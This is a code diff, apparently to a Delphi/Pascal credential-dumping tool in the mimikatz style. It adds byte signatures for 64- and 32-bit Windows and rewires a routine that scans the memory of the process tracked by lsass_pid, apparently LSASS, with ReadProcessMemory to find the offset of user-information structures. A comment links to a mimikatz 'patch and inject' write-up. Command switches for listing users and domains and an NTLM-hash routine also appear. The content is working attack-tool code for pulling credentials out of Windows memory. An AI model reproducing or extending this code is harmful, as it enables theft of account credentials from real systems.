@@ -12,6 +12,9 @@ type tdomainuser=record
 end;
 pdomainuser=^tdomainuser;
 
+const
+WIN_X64_Int_User_Info:array[0..3] of byte=($49, $8d, $41, $20);
+WIN_X86_Int_User_Info:array[0..4] of byte=($c6, $40, $22, $00, $8b);
 
 var
   lsass_pid:dword=0;
@@ -680,7 +683,7 @@ const
 
 var
   i:nativeint;
-  buffer,pattern:tbyte;
+  buffer,pattern:tbytes;
   read:cardinal;
 begin
 result:=0;
@@ -703,7 +706,7 @@ log('Searching...',0);
       if ReadProcessMemory( hprocess,pointer(i),@buffer[0],length(buffer),@read) then
         begin
         //log(inttohex(i,sizeof(pointer)));
-        if CompareMem (@WIN_X64 [0],@buffer[0],length(buffer)) then
+        if CompareMem (@pattern [0],@buffer[0],length(buffer)) then
            begin
            result:=i;
            break;
@@ -711,6 +714,24 @@ log('Searching...',0);
         end;//if readprocessmemory...
       end;//for
 log('Done!',0);
+end;
+
+function Init_Int_User_Info:tbytes;
+var
+  pattern:array of byte;
+begin
+
+  if LowerCase (osarch )='amd64' then
+     begin
+     setlength(pattern,length(WIN_X64_Int_User_Info));
+     CopyMemory (@pattern[0],@WIN_X64_Int_User_Info[0],length(WIN_X64_Int_User_Info));
+     end
+     else
+     begin
+     setlength(pattern,length(WIN_X86_Int_User_Info));
+     CopyMemory (@pattern[0],@WIN_X86_Int_User_Info[0],length(WIN_X86_Int_User_Info));
+     end;
+result:=pattern;
 end;
 
 //https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html
@@ -747,6 +768,7 @@ var
   read:cardinal;
   offset:nativeint=0;
   patch_pos:ShortInt=0;
+  pattern:tbytes;
 begin
   if pid=0 then exit;
   //if user='' then exit;
@@ -794,7 +816,11 @@ begin
                             log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
                             log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
                             addr:=MODINFO.lpBaseOfDll;
-                            offset:=search(hprocess,addr,MODINFO.SizeOfImage);
+                            pattern:=Init_Int_User_Info ;
+                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
+                            log('Searching...',0);
+                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
+                            log('Done!',0);
                             if offset<>0 then
                                  begin
                                  log('found:'+inttohex(offset,sizeof(pointer)),0);
@@ -837,6 +863,7 @@ begin
        end;//if openprocess...
 
 end;
+
 
 
 begin
@@ -917,13 +944,13 @@ begin
            log (GenerateNTLMHash (password),1);
            exit;
            end;
-  p:=pos('/getusers',cmdline);  //temporary
+  p:=pos('/getusers',cmdline);
   if p>0 then
        begin
        QueryUsers (pchar(server),'',nil );
        exit;
        end;
-  p:=pos('/getdomains',cmdline);  //temporary
+  p:=pos('/getdomains',cmdline);
   if p>0 then
        begin
        QueryDomains (pchar(server),nil );
